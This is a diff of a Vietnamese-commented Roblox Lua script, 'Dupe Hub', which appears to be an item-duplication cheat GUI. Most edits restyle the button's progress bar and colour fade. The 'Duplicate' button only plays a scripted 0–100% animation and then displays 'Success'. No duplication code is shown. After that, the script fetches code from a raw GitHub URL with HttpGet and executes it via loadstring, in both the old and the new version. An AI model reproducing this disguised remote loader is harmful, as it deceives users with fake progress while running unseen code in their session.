@@ -1,4 +1,4 @@
--- Dupe Hub v2.2 (PlayerGui): hiệu ứng song song + viền sáng khi xong
+-- Dupe Hub v2.3 (PlayerGui): hiệu ứng tím → xanh ép sát bên trái + viền sáng khi hoàn tất
 local Players = game:GetService("Players")
 local UIS = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
@@ -145,27 +145,15 @@ body.Position = UDim2.new(0, 18, 0, 56)
 
 -- 🧠 Nút chính
 local btnDup2 = pill(body, "🧠 Duplicate")
-btnDup2.Position = UDim2.new(0, 0, 0, 0)
 pillColor(btnDup2, 114, 106, 240)
 
--- ⚡ Thanh tiến trình trong nút
-local fillInside = Instance.new("Frame", btnDup2)
-fillInside.Size = UDim2.new(0, 0, 1, 0)
-fillInside.BackgroundColor3 = Color3.fromRGB(70, 200, 90)
-fillInside.BackgroundTransparency = 0.4
-fillInside.BorderSizePixel = 0
-fillInside.ZIndex = 0
-Instance.new("UICorner", fillInside).CornerRadius = UDim.new(0, 12)
-
--- 🌈 Luồng sáng bên trái chạy song song tiến trình
-local glowTrail = Instance.new("Frame", btnDup2)
-glowTrail.Size = UDim2.new(0, 10, 1, 0)
-glowTrail.Position = UDim2.new(0, -10, 0, 0)
-glowTrail.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-glowTrail.BackgroundTransparency = 0.6
-glowTrail.BorderSizePixel = 0
-glowTrail.ZIndex = 1
-Instance.new("UICorner", glowTrail).CornerRadius = UDim.new(1, 0)
+-- ⚡ Thanh tiến trình ép sát trái
+local fillEffect = Instance.new("Frame", btnDup2)
+fillEffect.Size = UDim2.new(0, 0, 1, 0)
+fillEffect.BackgroundColor3 = Color3.fromRGB(114, 106, 240)
+fillEffect.BorderSizePixel = 0
+fillEffect.ZIndex = 1
+Instance.new("UICorner", fillEffect).CornerRadius = UDim.new(0, 12)
 
 -- 🧩 Nhãn phần trăm
 local percentLabel = Instance.new("TextLabel", btnDup2)
@@ -176,23 +164,16 @@ percentLabel.TextSize = 18
 percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 percentLabel.TextTransparency = 1
 percentLabel.Text = "0%"
-percentLabel.ZIndex = 2
+percentLabel.ZIndex = 3
 
--- 🌈 Hiệu ứng tím → xanh mượt
-local function tweenColor(btn, duration)
-	local startColor = Color3.fromRGB(114, 106, 240)
-	local endColor = Color3.fromRGB(70, 200, 90)
-	for i = 0, 1, 1 / (duration * 60) do
-		local r = startColor.R + (endColor.R - startColor.R) * i
-		local g = startColor.G + (endColor.G - startColor.G) * i
-		local b = startColor.B + (endColor.B - startColor.B) * i
-		btn.BackgroundColor3 = Color3.new(r, g, b)
-		task.wait(1 / 60)
-	end
-	btn.BackgroundColor3 = endColor
+-- 🔄 Hàm đổi màu tím → xanh
+local function lerpColor(a, b, t)
+	return Color3.new(a.R + (b.R - a.R) * t, a.G + (b.G - a.G) * t, a.B + (b.B - a.B) * t)
 end
+local startColor = Color3.fromRGB(114, 106, 240)
+local endColor = Color3.fromRGB(70, 200, 90)
 
--- 💫 Viền sáng mờ dần
+-- 💫 Viền sáng nhấp nháy
 local function pulseGlow(btn)
 	local s = btn:FindFirstChildOfClass("UIStroke")
 	if not s then return end
@@ -204,44 +185,37 @@ local function pulseGlow(btn)
 	end
 end
 
--- 🎯 Khi bấm nút
+-- 🎯 Logic khi bấm nút
 btnDup2.MouseButton1Click:Connect(function()
-	pcall(function()
-		btnDup2.AutoButtonColor = false
-		btnDup2.TextTransparency = 1
-		percentLabel.TextTransparency = 0
-		fillInside.Size = UDim2.new(0, 0, 1, 0)
-		fillInside.BackgroundTransparency = 0.4
-		glowTrail.Position = UDim2.new(0, -10, 0, 0)
-		pillColor(btnDup2, 114, 106, 240)
+	btnDup2.AutoButtonColor = false
+	btnDup2.TextTransparency = 1
+	percentLabel.TextTransparency = 0
+	fillEffect.Size = UDim2.new(0, 0, 1, 0)
 
-		task.spawn(function()
-			for i = 1, 100 do
-				percentLabel.Text = i .. "%"
-				fillInside.Size = UDim2.new(i / 100, 0, 1, 0)
-				glowTrail.Position = UDim2.new(i / 100, -10, 0, 0)
-				task.wait(0.1)
-			end
+	for i = 1, 100 do
+		local t = i / 100
+		local newColor = lerpColor(startColor, endColor, t)
+		fillEffect.BackgroundColor3 = newColor
+		fillEffect.Size = UDim2.new(t, 0, 1, 0)
+		percentLabel.Text = i .. "%"
+		task.wait(0.1)
+	end
 
-			-- ✅ Khi hoàn tất
-			percentLabel.Text = "Success"
-			fillInside.BackgroundTransparency = 1
-			task.spawn(function() tweenColor(btnDup2, 2) end)
-			task.spawn(function() pulseGlow(btnDup2) end)
+	percentLabel.Text = "Success"
+	TweenService:Create(btnDup2, TweenInfo.new(1), {BackgroundColor3 = endColor}):Play()
+	task.spawn(function() pulseGlow(btnDup2) end)
 
-			task.wait(1)
-			btnDup2.TextTransparency = 0
-			percentLabel.TextTransparency = 1
-			btnDup2.Text = "🧠 Duplicate"
-			btnDup2.AutoButtonColor = true
+	task.wait(1.5)
+	btnDup2.TextTransparency = 0
+	percentLabel.TextTransparency = 1
+	btnDup2.Text = "🧠 Duplicate"
+	btnDup2.AutoButtonColor = true
 
-			-- Tải script gốc
-			local u = "https://raw.githubusercontent.com/tunadan212/Kkkk/refs/heads/main/K"
-			local s
-			pcall(function() s = game:HttpGet(u) end)
-			if s and s ~= "" then pcall(loadstring(s)) else warn("⚠️ Load Failed:", u) end
-		end)
-	end)
+	-- Load script gốc
+	local u = "https://raw.githubusercontent.com/tunadan212/Kkkk/refs/heads/main/K"
+	local s
+	pcall(function() s = game:HttpGet(u) end)
+	if s and s ~= "" then pcall(loadstring(s)) else warn("⚠️ Load Failed:", u) end
 end)
 
 -- Panel toggle
